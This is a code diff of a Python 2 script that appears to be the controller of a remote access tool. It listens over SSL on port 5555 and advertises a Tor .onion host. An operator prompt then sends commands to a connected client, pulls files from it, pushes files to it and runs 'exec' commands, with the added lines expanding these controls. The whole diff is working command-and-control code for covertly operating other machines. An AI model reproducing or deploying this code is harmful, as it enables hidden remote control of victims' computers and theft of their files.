@@ -1,18 +1,29 @@
-import socket, ssl, sys, os, hmac, hashlib
-from subprocess import Popen, PIPE, STDOUT
+import socket, ssl, os, sys, time, hashlib, hmac
+from colored import fg, bg, attr
+from subprocess import check_output
 
-bindsocket = socket.socket()
-bindsocket.bind(('', 5555))
-bindsocket.listen(5)
+host = '3pnzzdpq7aj6s6b6.onion'
+hasher = hashlib.sha256()
 
-pid1 = subprocess.Popen(args=["xterm","-e","./net.py"]).pid
+pid1 = subprocess.Popen(args=["xterm","-e","python net.py"]).pid
+
+print "%s---------------------------%s" % (fg(46), attr(0))
+print "%s[Starting server]%s" % (fg(46), attr(0))
+try:
+    bindsocket = socket.socket()
+    bindsocket.bind(('', 5555))
+    bindsocket.listen(5)
+    print "%s%s[server-status] ok.%s" % (fg(46), attr(1), attr(0))
+    print ("%s%s[Onion-Host] " + host + "%s") % (fg(202), attr(1), attr(0))
+    print "%s---------------------------%s" % (fg(46), attr(0))
+except socket.error, (value,message):
+    bindsocket.close()
+    print ("%sCould not open socket: " + message + "!!%s") % (fg(196), attr(0))
+    sys.exit(1)
 
 def RecvData():
     temp = connstream.read()
     return temp
-
-def SendData(inText):
-    connstream.write(inText)
 
 def CheckHash(fileName,fileHashHEX):
     with open(fileName, 'rb') as inFile:
@@ -33,10 +44,13 @@ def ExecIN(cmd):
     out = check_output(cmd, shell=True)
     print out
 
+def SendData(inText):
+    connstream.write(inText)
+
 def DownloadFILE(fileName):
     fileDOWN = open(fileName, 'wa')
     fileSize = int(RecvData())
-    print "[>>>]Downloading: %s Bytes: %s" % (fileName, fileSize)
+    print "   [>>>]Downloading: %s Bytes: %s" % (fileName, fileSize)
     FSD = 0
     while 1:
         temp = RecvData()
@@ -55,7 +69,7 @@ def DownloadFILE(fileName):
 def UploadFILE(fileName):
     fileUP = open(fileName, 'rb')
     fileSize = os.path.getsize(fileName)
-    print "[>>>]Uploading: %s Bytes: %s" % (fileName, fileSize)
+    print "   [>>>]Uploading: %s Bytes: %s" % (fileName, fileSize)
     FSD = 0
     while 1:
         tempData = fileUP.read()
@@ -72,29 +86,43 @@ def UploadFILE(fileName):
     SendData("SUF") #Server Upload Finished
 
 while True:
-    newsocket, fromaddr = bindsocket.accept()
-    connstream = ssl.wrap_socket(newsocket,
-                                 server_side=True,
-                                 certfile="priv_dom.crt",
-                                 keyfile="private_key.key")
     while True:
-        inText = raw_input('[input] ')
-        if inText.startswith("download"):
-            SendData(inText)
-            DownloadFILE(inText.split(" ")[1])
-        elif inText.startswith("upload"):
-            SendData(inText)
-            UploadFILE(inText.split(" ")[1])
-            chunk = RecvData()
-        elif inText == "terminate":
-            SendData("terminate")
-            connstream.shutdown(socket.SHUT_RDWR)
-            connstream.close()
+        print "%s...waiting...%s" % (fg(46), attr(0))
+        newsocket, fromaddr = bindsocket.accept()
+        try:
+            connstream = ssl.wrap_socket(newsocket,
+                                 server_side=True,
+                                 certfile="priv_dom2.crt",
+                                 keyfile="private_key.key")
+        except ssl.SSLError:
+            print "%s%s!!!WARNING!!! BAD CLIENT (or other SSL problem)%s" % (fg(9),attr(1),attr(0))
             break
-        else:
-            connstream.write(inText)
-            outTT = RecvData()
-            print '[outText] ' + outTT
-        # make a function to handle exit
-        #connstream.shutdown(socket.SHUT_RDWR)
-        #connstream.close()
+        print "%s...probably good client...%s" % (fg(46), attr(0))
+        time.sleep(2)
+        ExecIN("clear")
+        cType = RecvData()
+        print ("%s----[new-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(202),attr(0))
+        while True:
+            inText = raw_input('[input] ')
+            if inText.startswith("download"):
+                SendData(inText)
+                DownloadFILE(inText.split(" ")[1])
+            elif inText.startswith("upload"):
+                SendData(inText)
+                UploadFILE(inText.split(" ")[1])
+                chunk = RecvData()
+            elif inText == "terminate":
+                SendData("terminate")
+                print ("%s%s----[exit-client] " + str(fromaddr) + " :: " + cType + "%s") % (fg(9),attr(1),attr(0))
+                connstream.shutdown(socket.SHUT_RDWR)
+                connstream.close()
+                break
+            elif inText.startswith("exec"):
+                SendData(inText)
+                print ""
+                outEXEC = RecvData()
+                print outEXEC
+            else:
+                connstream.write(inText)
+                outTT = RecvData()
+                print ('%s[outText] ' + outTT +"%s") % (fg(6),attr(0))
